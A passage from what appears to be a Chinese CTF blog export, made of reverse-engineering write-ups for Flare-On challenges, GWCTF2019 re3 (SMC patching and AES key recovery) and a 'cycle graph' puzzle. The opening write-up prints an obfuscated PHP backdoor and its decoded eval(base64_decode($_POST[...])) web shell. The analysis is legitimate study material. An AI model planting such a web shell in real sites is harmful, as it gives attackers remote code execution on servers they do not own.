$terms=array(\u0026#34;M\u0026#34;, \u0026#34;Z\u0026#34;, \u0026#34;]\u0026#34;, \u0026#34;p\u0026#34;, \u0026#34;\\\\\u0026#34;, \u0026#34;w\u0026#34;, \u0026#34;f\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;v\u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;a\u0026#34;, \u0026#34;Q\u0026#34;, \u0026#34;z\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;s\u0026#34;, \u0026#34;m\u0026#34;, \u0026#34;+\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;g\u0026#34;, \u0026#34;W\u0026#34;, \u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;q\u0026#34;, \u0026#34;y\u0026#34;, \u0026#34;T\u0026#34;, \u0026#34;V\u0026#34;, \u0026#34;n\u0026#34;, \u0026#34;S\u0026#34;, \u0026#34;X\u0026#34;, \u0026#34;)\u0026#34;, \u0026#34;9\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;P\u0026#34;, \u0026#34;r\u0026#34;, \u0026#34;\u0026amp;\u0026#34;, \u0026#34;\\\u0026#39;\u0026#34;, \u0026#34;!\u0026#34;, \u0026#34;x\u0026#34;, \u0026#34;G\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;~\u0026#34;, \u0026#34;O\u0026#34;, \u0026#34;h\u0026#34;, \u0026#34;u\u0026#34;, \u0026#34;U\u0026#34;, \u0026#34;@\u0026#34;, \u0026#34;;\u0026#34;, \u0026#34;H\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;F\u0026#34;, \u0026#34;6\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;^\u0026#34;, \u0026#34;,\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;l\u0026#34;, \u0026#34;$\u0026#34;, \u0026#34;d\u0026#34;, \u0026#34;`\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;N\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;[\u0026#34;, \u0026#34;0\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;J\u0026#34;, \u0026#34;-\u0026#34;, \u0026#34;5\u0026#34;, \u0026#34;_\u0026#34;, \u0026#34;A\u0026#34;, \u0026#34;=\u0026#34;, \u0026#34;{\u0026#34;, \u0026#34;k\u0026#34;, \u0026#34;o\u0026#34;, \u0026#34;7\u0026#34;, \u0026#34;#\u0026#34;, \u0026#34;i\u0026#34;, \u0026#34;I\u0026#34;, \u0026#34;Y\u0026#34;, \u0026#34;(\u0026#34;, \u0026#34;j\u0026#34;, \u0026#34;/\u0026#34;, \u0026#34;?\u0026#34;, \u0026#34;K\u0026#34;, \u0026#34;c\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;t\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;8\u0026#34;, \u0026#34;e\u0026#34;, \u0026#34;|\u0026#34;); $order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47); $do_me=\u0026#34;\u0026#34;; for($i=0;$i\u0026lt;count($order);$i++){ $do_me=$do_me.$terms[$order[$i]]; } eval($do_me); ?\u0026gt;用国赛学来的方法，直接把 eval 改成 print 然后放在线环境运行一下，得到第二份脚本\n$_= \\\u0026#39;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\\\u0026#39;; $__=\\\u0026#39;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\\\u0026#39;; $___=\u0026#34;\\x62\\141\\x73\\145\\x36\\64\\x5f\\144\\x65\\143\\x6f\\144\\x65\u0026#34;; eval($___($__)); 这次好像在线环境运行不了，看一下字符串都是什么，复制到python里，发现 $___ 是 base64_decode\n于是把 $__ 解码一下，得到\n$code=base64_decode($_);eval($code); 所以只要解码 $_ 就可以了，得到\nif(isset($_POST[\u0026#34;\\\\97\\\\49\\\\49\\\\68\\\\x4F\\\\84\\\\116\\\\x68\\\\97\\\\x74\\\\x44\\\\x4F\\\\x54\\\\x6A\\\\97\\\\x76\\\\x61\\\\x35\\\\x63\\\\x72\\\\97\\\\x70\\\\x41\\\\84\\\\x66\\\\x6C\\\\97\\\\x72\\\\x65\\\\x44\\\\65\\\\x53\\\\72\\\\111\\\\110\\\\68\\\\79\\\\84\\\\99\\\\x6F\\\\x6D\u0026#34;])) { eval(base64_decode($_POST[\u0026#34;\\\\97\\\\49\\\\x31\\\\68\\\\x4F\\\\x54\\\\116\\\\104\\\\x61\\\\116\\\\x44\\\\79\\\\x54\\\\106\\\\97\\\\118\\\\97\\\\53\\\\x63\\\\114\\\\x61\\\\x70\\\\65\\\\84\\\\102\\\\x6C\\\\x61\\\\114\\\\101\\\\x44\\\\65\\\\x53\\\\72\\\\111\\\\x6E\\\\x44\\\\x4F\\\\84\\\\99\\\\x6F\\\\x6D\u0026#34;])); } POST请求是什么不太清楚，但看到这些字符好像都在可见字符范围内，所以直接转成string，得到\nb\u0026#39;a11DOTthatDOTjava5crapATflareDASHonDOTcom\u0026#39; 把 DOT，AT，DASH 都转成对应的符号，就拿到flag了\n[FlareOn4]greek_to_me 尝试运行一下，发现不能输入\n逆向，发现127.0.0.1的字样，以及socket等明显的网络通信函数\n直接运行的时候看一下主机端口，发现是 127.0.0.1:2222，用Windows下的nc连上去就可以进行调试了\nSMC还是很明显的\n发现解SMC时仅用了第一个字节，但由于不知道里面有什么，猜测可能是对后面的字节进行验证，所以决定将程序本地复现一下，爆破解SMC的密钥\n#include \u0026lt;stdio.h\u0026gt; unsigned char ida_chars[] = { 0x33, 0xE1, 0xC4, 0x99, 0x11, 0x06, 0x81, 0x16, 0xF0, 0x32, 0x9F, 0xC4, 0x91, 0x17, 0x06, 0x81, 0x14, 0xF0, 0x06, 0x81, 0x15, 0xF1, 0xC4, 0x91, 0x1A, 0x06, 0x81, 0x1B, 0xE2, 0x06, 0x81, 0x18, 0xF2, 0x06, 0x81, 0x19, 0xF1, 0x06, 0x81, 0x1E, 0xF0, 0xC4, 0x99, 0x1F, 0xC4, 0x91, 0x1C, 0x06, 0x81, 0x1D, 0xE6, 0x06, 0x81, 0x62, 0xEF, 0x06, 0x81, 0x63, 0xF2, 0x06, 0x81, 0x60, 0xE3, 0xC4, 0x99, 0x61, 0x06, 0x81, 0x66, 0xBC, 0x06, 0x81, 0x67, 0xE6, 0x06, 0x81, 0x64, 0xE8, 0x06, 0x81, 0x65, 0x9D, 0x06, 0x81, 0x6A, 0xF2, 0xC4, 0x99, 0x6B, 0x06, 0x81, 0x68, 0xA9, 0x06, 0x81, 0x69, 0xEF, 0x06, 0x81, 0x6E, 0xEE, 0x06, 0x81, 0x6F, 0xAE, 0x06, 0x81, 0x6C, 0xE3, 0x06, 0x81, 0x6D, 0xEF, 0x06, 0x81, 0x72, 0xE9, 0x06, 0x81, 0x73, 0x7C }; #define HIBYTE(x) ((x \u0026amp; 0xFF00) \u0026gt;\u0026gt; 8)  int main(){ for (unsigned short buf = 0; buf \u0026lt;= 0xff; buf++){ unsigned char new_char[130]; unsigned char *a1 = new_char; unsigned int i = 0; do { *a1 = (buf ^ ida_chars[i++]) + 34; ++a1; } while ( i \u0026lt; 121 ); unsigned int v2 = 0x79; // 0x79  a1 = new_char; unsigned short v3 = 255; for ( i = 255; v2; v3 = HIBYTE(v3) + (unsigned char)v3 ) { unsigned short v5 = i; int v6 = v2; if ( v2 \u0026gt; 0x14 ) v6 = 0x14; v2 -= v6; do { v5 += *a1; v3 += v5; ++a1; --v6; } while ( v6 ); i = HIBYTE(v5) + (unsigned char)v5; } int ret = (HIBYTE(i) + (unsigned char)i) | ((v3 \u0026lt;\u0026lt; 8) + (v3 \u0026amp; 0xFF00)); // if (buf == \u0026#39;f\u0026#39;)  // printf(\u0026#34;%x\\n\u0026#34;, ret); // 0xf51c  // if (buf == \u0026#39;@\u0026#39;)  // printf(\u0026#34;%x\\n\u0026#34;, ret); // 0x60ee  if (ret == 0xFB5E) { printf(\u0026#34;%d\\n\u0026#34;, buf); break; } // printf(\u0026#34;%c %x\\n\u0026#34;, buf, ret);  } } 一开始给的范围小了（以为会是可见字符），一直爆破不出来，反复验证了好多次，后来才发现范围是 0-0xff\n最后爆破出来是 0xA2，思考了一下怎么nc传递不可见字符，然后决定直接动调改内存\n下断点，然后修改buf，之后看一眼SMC解密结果，发现直接给flag了，去栈里dump一下\n[FlareOn5]FLEGGO 看名字还以为是个go呢，结果发现是个披着re外套的misc（流汗\n解压后发现有一堆程序，先随便挑一个日\n动调发现需要输入一串字符串，刚开始还想看看是不是和base64有关，后来发现这串字符串就在exe文件中，那就直接上python整批量操作了\n发现password存的地址是固定的，那就用subprocess对每个exe运行一下\n放个脚本\nimport subprocess import os # from pwn import * files = [ \u0026#34;./1BpnGjHOT7h5vvZsV4vISSb60Xj3pX5G.exe\u0026#34;, \u0026#34;./1JpPaUMynR9GflWbxfYvZviqiCB59RcI.exe\u0026#34;, \u0026#34;./2AljFfLleprkThTHuVvg63I7OgjG2LQT.exe\u0026#34;, \u0026#34;./3Jh0ELkck1MuRvzr8PLIpBNUGlspmGnu.exe\u0026#34;, \u0026#34;./4ihY3RWK4WYqI4XOXLtAH6XV5lkoIdgv.exe\u0026#34;, \u0026#34;./7mCysSKfiHJ4WqH2T8ERLE33Wrbp6Mqe.exe\u0026#34;, \u0026#34;./AEVYfSTJwubrlJKgxV8RAl0AdZJ5vhhy.exe\u0026#34;, \u0026#34;./BG3IDbHOUt9yHumPceLTVbObBHFneYEu.exe\u0026#34;, \u0026#34;./Bl0Iv5lT6wkpVCuy7jtcva7qka8WtLYY.exe\u0026#34;, \u0026#34;./Bp7836noYu71VAWc27sUdfaGwieALfc2.exe\u0026#34;, \u0026#34;./E36RGTbCE4LDtyLi97l9lSFoR7xVMKGN.exe\u0026#34;, \u0026#34;./Ew93SSPDbgiQYo4E4035A16MJUxXegDW.exe\u0026#34;, \u0026#34;./HDHugJBqTJqKKVtqi3sfR4BTq6P5XLZY.exe\u0026#34;, \u0026#34;./IXITujCLucnD4P3YrXOud5gC7Bwcw6mr.exe\u0026#34;, \u0026#34;./JIdE7SESzC1aS58Wwe5j3i6XbpkCa3S6.exe\u0026#34;, \u0026#34;./JXADoHafRHDyHmcTUjEBOvqq95spU7sj.exe\u0026#34;, \u0026#34;./K7HjR3Hf10SGG7rgke9WrRfxqhaGixS0.exe\u0026#34;, \u0026#34;./MrA1JmEDfPhnTi5MNMhqVS8aaTKdxbMe.exe\u0026#34;, \u0026#34;./NaobGsJ2w6qqblcIsj4QYNIBQhg3gmTR.exe\u0026#34;, \u0026#34;./P2PxxSJpnquBQ3xCvLoYj4pD3iyQcaKj.exe\u0026#34;, \u0026#34;./PvlqINbYjAY1E4WFfc2N6rZ2nKVhNZTP.exe\u0026#34;, \u0026#34;./SDIADRKhATsagJ3K8WwaNcQ52708TyRo.exe\u0026#34;, \u0026#34;./SeDdxvPJFHCr7uoQMjwmdRBAYEelHBZB.exe\u0026#34;, \u0026#34;./aSfSVMn7B8eRtxgJgwPP5Y5HiDEidvKg.exe\u0026#34;, \u0026#34;./azcyERV8HUbXmqPTEq5JFt7Ax1W5K4wl.exe\u0026#34;, \u0026#34;./bmYBZTBJlaFNbbwpiOiiQVdzimx8QVTI.exe\u0026#34;, \u0026#34;./cWvFLbliUfJl7KFDUYF1ABBFYFb6FJMz.exe\u0026#34;, \u0026#34;./d4NlRo5umkvWhZ2FmEG32rXBNeSSLt2Q.exe\u0026#34;, \u0026#34;./dT4Xze8paLOG7srCdGLsbLE1s6m3EsfX.exe\u0026#34;, \u0026#34;./dnAciAGVdlovQFSJmNiPOdHjkM3Ji18o.exe\u0026#34;, \u0026#34;./eEJhUoNbuc40kLHRo8GB7bwFPkuhgaVN.exe\u0026#34;, \u0026#34;./eovBHrlDb809jf08yaAcSzcX4T37F1NI.exe\u0026#34;, \u0026#34;./gFZw7lPUlbOXBvHRc31HJI5PKwy745Wv.exe\u0026#34;, \u0026#34;./hajfdokqjogmoWfpyp4w0feoeyhs1QLo.exe\u0026#34;, \u0026#34;./iJO15JsCa1bV5anXnZ9dTC9iWbEDmdtf.exe\u0026#34;, \u0026#34;./jJHgJjbyeWTTyQqISuJMpEGgE1aFs5ZB.exe\u0026#34;, \u0026#34;./kGQY35HJ7gvXzDJLWe8mabs3oKpwCo6L.exe\u0026#34;, \u0026#34;./lk0SOpnVIzTcC1Dcou9R7prKAC3laX0k.exe\u0026#34;, \u0026#34;./u3PL12jk5jCZKiVm0omvh46yK7NDfZLT.exe\u0026#34;, \u0026#34;./u8mbI3GZ8WtwruEiFkIl0UKxJS917407.exe\u0026#34;, \u0026#34;./v6RkHsLya4wTAh71C65hMXBsTc1ZhGZT.exe\u0026#34;, \u0026#34;./w3Y5YeglxqIWstp1PLbFoHvrQ9rN3F3x.exe\u0026#34;, \u0026#34;./wmkeAU8MdYrC9tEUMHH2tRMgaGdiFnga.exe\u0026#34;, \u0026#34;./x4neMBrqkYIQxDuXpwJNQZOlfyfA0eXs.exe\u0026#34;, \u0026#34;./xatgydl5cadiWFY4EXMRuoQr22ZIRC1Y.exe\u0026#34;, \u0026#34;./xyjJcvGAgswB7Yno5e9qLF4i13L1iGoT.exe\u0026#34;, \u0026#34;./y77GmQGdwVL7Fc9mMdiLJMgFQ8rgeSrl.exe\u0026#34;, \u0026#34;./zRx3bsMfOwG8IaayOeS8rHSSpiRfc9IB.exe\u0026#34; ] for f in files: cur_file = open(f, \u0026#39;rb\u0026#39;) cur_file.seek(0x2AB0) read_file = cur_file.read(32) password = b\u0026#39;\u0026#39; for p in read_file: if p != 0: password += p.to_bytes(1, \u0026#39;big\u0026#39;) # print (password) p = subprocess.Popen(f, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) out, err = p.communicate(password + b\u0026#39;\\n\u0026#39;) # print (out) pic_name = out[47:59] char_of_pic = out[-3].to_bytes(1, \u0026#39;big\u0026#39;) os.rename(pic_name, char_of_pic + pic_name) 输出会说每个图片对应的字符，点开图片后发现左上角有数字，应该是下标\n这tm就是misc啊！\n剩下的就是手动找位置了，屑\n[FlareOn1]5get_it 给的是一个DLL文件（没记错的话），应该是用来钩取键盘输入的，根据不同的输入执行不同的内容，观察到有个函数为 sub_10001240，执行成功就说明通过了\n查找引用\nconst char *sub_10009AF0() { if ( dword_100194FC \u0026gt; 0 ) { _cfltcvt_init(); sub_10001240(); } return \u0026#34;m\u0026#34;; } 要求让内存中一个数不为0，根据这个数再向上找\nconst char *sub_10009B60() { if ( dword_1001947C \u0026lt;= 0 ) { if ( dword_10019490 \u0026lt;= 0 ) { if ( dword_100194E0 \u0026lt;= 0 ) { if ( dword_100194EC \u0026lt;= 0 ) { if ( dword_100194F8 \u0026lt;= 0 ) { _cfltcvt_init(); } else { dword_100194F8 = 0; dword_100194FC = 1; } } else { dword_100194EC = 0; dword_100194F0 = 1; } } else { dword_100194E0 = 0; dword_100194E4 = 1; } } else { dword_10019490 = 0; dword_10019494 = 1; } } else { dword_1001947C = 0; dword_10019480 = 1; } return \u0026#34;o\u0026#34;; } 看到最里面就是赋值为1，所以最后两位输入就是 om\n根据这个方法一点一点向上找引用，就能恢复出flag\n不过不知道大小写是怎么判断的，网上也没查到\n[FlareOn]starter baby\n先执行给的程序，会自动解压出一个小程序，反编译一下，观察到\nReadFile(v2, byte_402158, 0x32u, \u0026amp;NumberOfBytesWritten, 0); v0 = 0; while ( ((unsigned __int8)byte_402158[v0] ^ 0x7D) == byte_402140[v0] ) { if ( ++v0 \u0026gt;= 24 ) return WriteFile(hFile, aYouAreSuccess, 0x12u, \u0026amp;NumberOfBytesWritten, 0); } 直接dump数据进行异或就行\n[FlareOn2]elfie 这题是个python的可执行文件，能解出一个混淆过的python文件\nimport base64 O0OO0OO00000OOOO0OOOOO0O00O0O0O0 = \u0026#39;IRGppV0FJM3BRRlNwWGhNNG\u0026#39; OO0O0O00OO00OOOOOO0O0O0OOO0OOO0O = \u0026#39;UczRkNZZ0JVRHJjbnRJUWlJV3FRTkpo\u0026#39; OOO0000O0OO0OOOOO000O00O0OO0O00O = \u0026#39;xTStNRDJqZG9nRCtSU1V\u0026#39; OOO0000O0OO0OOOOO000O00O0OO0O00O += \u0026#39;Rbk51WXI4dmRaOXlwV3NvME0ySGp\u0026#39; # many lines exec(base64.b64decode(OOO)) 把最后的exec改成print，查看一下代码，发现里面的字符串都被 [::-1] 了，解一下发现其中一个就是flag\n[FlareOn2]Android so层逆向，程序是将前后两个输入合并，然后做一个质因数分解，手动dump了一下数据，然后写脚本（如果会idapython就好了，留下了不学无术的泪水.jpg）\nfrom libnum import * for f in extract: flag = 1 for i in range(len(f)): flag *= pow(prime[i], f[i]) print (n2s(flag).decode(), end = \u0026#39;\u0026#39;) print () ","date":"2021-04-09T01:04:16Z","permalink":"/post/buuoj-flareon-challenge/","title":"BUUOJ FlareOn Challenge"},{"content":"静态分析 首先通过关键字符串 Wrong 进入 main 函数\nvoid __fastcall __noreturn main(int a1, char **a2, char **a3) { int i; // [rsp+8h] [rbp-48h]  char s[40]; // [rsp+20h] [rbp-30h] BYREF  unsigned __int64 v5; // [rsp+48h] [rbp-8h]  v5 = __readfsqword(0x28u); __isoc99_scanf(\u0026#34;%39s\u0026#34;, s); if ( (unsigned int)strlen(s) != 32 ) { puts(\u0026#34;Wrong!\u0026#34;); exit(0); } mprotect(\u0026amp;dword_400000, 0xF000uLL, 7); for ( i = 0; i \u0026lt;= 223; ++i ) *((_BYTE *)sub_402219 + i) ^= 0x99u; sub_40207B((__int64)\u0026amp;unk_603170); sub_402219(); } 阅读一下代码，发现先是输入一个长度为32的字符串\n随后对一个奇怪的地址执行了一个函数，但这个地址和输入应该没有关系，可以暂时不管\n注意到有个 for 循环对某一个地址的值做了个异或，最后又调用了这个地址，这是简单且经典的 SMC\n用 idapython patch 一下，用运行脚本功能，由于长度较短，直接在ida中手写了\nstart = 0x402219 end = start + 223 for i in range(start, end + 1): patch_byte(i, get_wide_byte(i) ^ 0x99) 运行完后进入这个地址，好像不能在 402219 处新建函数，只能在 40221A 处按 p 键新建函数，F5 查看这个函数\n__int64 __fastcall sub_40221A(__int64 a1) { unsigned int v2; // [rsp+18h] [rbp-D8h]  int i; // [rsp+1Ch] [rbp-D4h]  char v4[200]; // [rsp+20h] [rbp-D0h] BYREF  unsigned __int64 v5; // [rsp+E8h] [rbp-8h]  v5 = __readfsqword(0x28u); sub_400A71((__int64)v4, (__int64)\u0026amp;unk_603170);// 经典密钥生成  sub_40196E((__int64)v4, a1); // 这tm是AES  sub_40196E((__int64)v4, a1 + 16); v2 = 1; for ( i = 0; i \u0026lt;= 31; ++i ) { if ( *(_BYTE *)(i + a1) != byte_6030A0[i] ) v2 = 0; } return v2; } 最后的 byte_6030A0 显然是加密结果的校验了\n上面有两个函数 sub_400A71 和 sub_40196E，400A71 调用了之前出现的 603170 猜测是一个密钥，40196E 使用了两次，且分别是对输入的前一半与后一半的操作，猜测是加密函数。密钥生成和输入无关，完全可以通过动态调试得到结果，所以查看加密函数。\n__int64 __fastcall sub_401828(__int64 a1, __int64 a2) { unsigned __int8 i; // [rsp+1Fh] [rbp-1h]  sub_400B0A(0LL, a1, a2); // 这是aes哦  for ( i = 1; i \u0026lt;= 9u; ++i ) { sub_400BAC(a1); sub_400C1F(a1); sub_400D27(a1); sub_400B0A(i, a1, a2); } sub_400BAC(a1); sub_400C1F(a1); return sub_400B0A(10LL, a1, a2); } 一开始被各个函数吓一跳，但点到某个函数里发现好像是 $4\\times 4$ 的一个方阵，又发现某些函数重复出现的规则和 AES 很像，于是推测这个是 AES 加密算法，稍微看了下具体的函数实现，应该没有大问题，于是着手解密了。\n解密 首先动态调试拿到密钥\n直接步过这句代码： sub_40207B((__int64)\u0026amp;unk_603170);\ngdb-peda$ b *0x4021e4 Breakpoint 2 at 0x4021e4 gdb-peda$ c gdb-peda$ n gdb-peda$ x/50x 0x603170 0x603170: 0xcb 0x8d 0x49 0x35 0x21 0xb4 0x7a 0x4c 0x603178: 0xc1 0xae 0x7e 0x62 0x22 0x92 0x66 0xce 0x603180: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 拿到密钥\n随后直接到 ida 相应地址中取出密文\n用之前写过的 AES 脚本解密\nimport my_aes from libnum import n2s key = 0xcb8d493521b47a4cc1ae7e62229266ce cipher1 = 0xBC0AADC0147C5ECCE0B140BC9C51D52B cipher2 = 0x46B2B9434DE5324BAD7FB4B39CDB4B5B print(n2s(my_aes.aes_encrypt(cipher1, key)), end = \u0026#39;\u0026#39;) print(n2s(my_aes.aes_encrypt(cipher2, key))) 输出如下：\nb\u0026#39;flag{924a9ab2163\u0026#39;b\u0026#39;d390410d0a1f670}\u0026#39; 得到 flag\n","date":"2021-04-08T22:36:12Z","permalink":"/post/gwctf2019-re3-writeup/","title":"GWCTF2019 re3 writeup"},{"content":" cycle graph 天津垓 fxck easyparser  cycle graph 逆向代码 根据提示，这是一道纯算法题，拖到 ida 中，根据关键字符串定位到关键函数。查看核心代码\ndword_403370 = 0; v1 = \u0026amp;unk_403384; byte_403374 = 48; v2 = 0; dword_403378 = (int)\u0026amp;unk_403380; do { v3 = dword_402178[v2]; ++v2; *(v1 - 1) = v3; *v1 = (char *)\u0026amp;unk_403380 + 12 * dword_402274[v2]; v1[1] = (char *)\u0026amp;unk_403380 + 12 * dword_4021F4[v2]; v1 += 3; } while ( (signed int)v1 \u0026lt; (signed int)\u0026amp;unk_403504 ); 上面的代码是主函数开头的初始化部分\nsub_401020(\u0026#34;You need a flag to get out of this:\\n\u0026#34;, a1); scan(\u0026#34;%s\u0026#34;, \u0026amp;input); v4 = dword_403370; // 0  v5 = byte_403374; // 48  v6 = 5; v7 = dword_403378; do { v11 = *(\u0026amp;input + v6); if ( *(_DWORD *)v7 + v5 == v11 ) { v7 = *(_DWORD *)(v7 + 4); } else { if ( v5 - *(_DWORD *)v7 != v11 ) { sub_401020(\u0026#34;This is not flag~\\n\u0026#34;, v10); system(\u0026#34;pause\u0026#34;); exit(1); } v7 = *(_DWORD *)(v7 + 8); } v5 = *(\u0026amp;input + v6); ++v4; ++v6; byte_403374 = v5; dword_403378 = v7; dword_403370 = v4; } while ( v6 \u0026lt; 21 ); 上面的代码是根据输入进行的一系列操作\nif ( input != \u0026#39;f\u0026#39; || v13 != \u0026#39;l\u0026#39; || v14 != \u0026#39;a\u0026#39; || v15 != \u0026#39;g\u0026#39; || v16 != \u0026#39;{\u0026#39; || v17 != \u0026#39;}\u0026#39; ) { v8 = \u0026#34;illegal input~\\n\u0026#34;; } else if ( v4 \u0026gt; 16 || (_UNKNOWN *)v7 != \u0026amp;unk_4034F4 ) { v8 = \u0026#34;This is not flag~\\n\u0026#34;; } else { v8 = \u0026#34;Congratulations!!\\n\u0026#34;; } sub_401020(v8, v11); system(\u0026#34;pause\u0026#34;); return 0; 上面的代码就是最后的验证环节\n一开始尝试直接看代码，发现自己被绕进去了，完全不知道各个地址是什么东西，所以考虑通过动态调试来得到初始化后的结果\n动态调试 直接拖到 x32dbg 中，在第一个输出的字符串前面打上断点，然后运行到断点的位置\n分析了一下初始化部分，认为关键的内存部分应该是从 403370 开始一直到 403540 这部分\n于是找到 3370 ，右键选择内存窗口找到地址\n鉴于数据量不大，直接手dump下来就行了\n00C43370 00 00 00 00 30 00 00 00 80 33 C4 00 00 00 00 00 ....0....3Ä..... 00C43380 34 00 00 00 98 33 C4 00 8C 33 C4 00 02 00 00 00 4....3Ä..3Ä..... 00C43390 98 33 C4 00 E0 33 C4 00 2C 00 00 00 8C 33 C4 00 .3Ä.à3Ä.,....3Ä. 00C433A0 D4 33 C4 00 2A 00 00 00 58 34 C4 00 94 34 C4 00 Ô3Ä.*...X4Ä..4Ä. 00C433B0 06 00 00 00 D4 33 C4 00 EC 33 C4 00 2A 00 00 00 ....Ô3Ä.ì3Ä.*... 00C433C0 98 33 C4 00 64 34 C4 00 2F 00 00 00 B8 34 C4 00 .3Ä.d4Ä./...¸4Ä. 00C433D0 F4 34 C4 00 2A 00 00 00 1C 34 C4 00 94 34 C4 00 ô4Ä.*....4Ä..4Ä. 00C433E0 33 00 00 00 B0 33 C4 00 EC 33 C4 00 03 00 00 00 3...°3Ä.ì3Ä..... 00C433F0 F8 33 C4 00 1C 34 C4 00 02 00 00 00 B0 33 C4 00 ø3Ä..4Ä.....°3Ä. 00C43400 10 34 C4 00 32 00 00 00 7C 34 C4 00 DC 34 C4 00 .4Ä.2...|4Ä.Ü4Ä. 00C43410 32 00 00 00 28 34 C4 00 F8 33 C4 00 32 00 00 00 2...(4Ä.ø3Ä.2... 00C43420 8C 33 C4 00 A0 34 C4 00 30 00 00 00 80 33 C4 00 .3Ä. 4Ä.0....3Ä. 00C43430 EC 33 C4 00 03 00 00 00 28 34 C4 00 A0 34 C4 00 ì3Ä.....(4Ä. 4Ä. 00C43440 01 00 00 00 BC 33 C4 00 AC 34 C4 00 32 00 00 00 ....¼3Ä.¬4Ä.2... 00C43450 D4 33 C4 00 EC 33 C4 00 2B 00 00 00 D0 34 C4 00 